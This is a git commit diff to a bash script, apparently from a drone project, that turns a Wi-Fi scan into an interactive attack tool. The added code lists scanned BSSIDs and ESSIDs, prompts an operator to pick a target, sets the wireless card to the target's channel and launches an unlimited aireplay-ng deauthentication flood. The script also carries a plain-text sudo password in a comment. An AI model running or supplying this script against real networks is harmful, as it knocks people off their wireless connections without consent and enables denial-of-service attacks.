f408aab6e703a9e7f009a9b80412d19a35a3e52d
fresharr <50896923+fresharr@users.noreply.github.com>
2020-11-02 21:13:30 -0500

    Update to deauth shell script
    updates add display of BSSIDs and ESSIDs from scan, input from operator with validation, and launch of attack from shell script.

--- deauth-0.sh
+++ deauth-0.sh
@@ -1,8 +1,11 @@
 #!/bin/bash
 
 #Script for Drone40
-#Created by Matt Arrison
+#Created by Matt Arrison and Cooper Guzzi
 #echo "kalipass" | sudo -S ./deauth-0.sh
+bold=$(tput bold)
+normal=$(tput sgr0)
+
 echo "p455w0rd"
 echo "              //"
 echo "              |"
@@ -16,13 +19,13 @@ echo "              //"
 
 echo " "
 echo "Waiting for drone to get into place..."
-sleep 20 #can change values based on how long it will it take to get into place
-echo "ATTACK!!"
+sleep 10 #can change values based on how long it will it take to get into place
+echo "STARTING RECON!!"
 sleep 10
 
 switch="0"
 
-time=20
+time=10
 mkdir scan1
 chmod 775 scan1
 cd scan1
@@ -58,7 +61,50 @@ else
 	echo "Select the Wi-Fi to you wish to attack..."
 fi
 
-# There are 2 options for this attack:
+#sudo iwconfig wlan0 channel 6
+
+# Print out ESSIDs and BSSIDs of scanned networks and load BSSIDs and ESSIDs into an associative array
+declare -A networks
+declare -A channels
+while IFS=, read -r bssid first last channel speed privacy cipher authentication power numBeacons numIV lanIP lenID essid key
+do
+	if [[ "$essid" = *[!\ ]* ]]; then
+		if [ "$essid" != " ESSID" ]; then
+			echo "${bold}ESSID:${normal} $essid ${bold}BSSID:${normal} $bssid"
+			networks["$bssid"]="$essid"
+			channels["$bssid"]="$channel"
+		fi
+	fi
+done < bigData-01.csv
+
+# Prompt Operator for network to attack:
+invalid=true
+while $invalid; do
+	read -p "Enter BSSID of Network to attack: " targetVar < /dev/tty
+	for name in "${!networks[@]}"; do
+		if [ $name == $targetVar ]; then
+			invalid=false
+		fi
+	done
+	if $invalid; then
+		echo "Invalid BSSID entered. Try again."
+	fi
+done
+echo "Attacking network $targetVar"
+# set channel to channel the targeted network is on
+targetChannel=${channels["$targetVar"]}
+# trim leading whitespace
+targetChannel=${targetChannel##*( )}
+# echo "Target Channel: $targetChannel"
+sudo iwconfig wlan0 channel $targetChannel
+# send attack to selected network
+sudo aireplay-ng --deauth 0 -a $targetVar wlan0
+# print contents of associative array
+#for name in "${!networks[@]}"; do
+	#echo "$name - ${networks[$name]}"
+#done
+
+# There are two options for this attack:
 
 # 1) Send the drone back to home base after collecting the wifi data and the operator reads the 
 #    csv file to determine exactly what network to attack
